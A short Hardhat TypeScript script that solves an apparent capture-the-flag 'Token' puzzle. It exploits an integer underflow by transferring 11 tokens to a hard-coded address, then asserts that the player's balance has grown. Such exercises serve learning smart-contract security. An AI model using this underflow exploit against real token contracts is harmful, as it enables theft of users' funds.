// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";
import assert from "assert";
import { BigNumber } from "ethers";

const PLAYER_ADDRESS = contractAddresses.Player;
const CONTRACT = contractAddresses.Token;

async function main() {
    console.log("Script to solve Token puzzle \n ========================================== \n");

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Token", CONTRACT, attacker);

    let balance = await contract.balanceOf(PLAYER_ADDRESS);

    await contract.transfer("0xF1823bc4243b40423b8C8c3F6174e687a4C690b8", 11);
    balance = await contract.balanceOf(PLAYER_ADDRESS);

    assert(balance > ethers.BigNumber.from(10), "Balance didn't increase");
    console.log("Balance increased, you can submit the solution");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
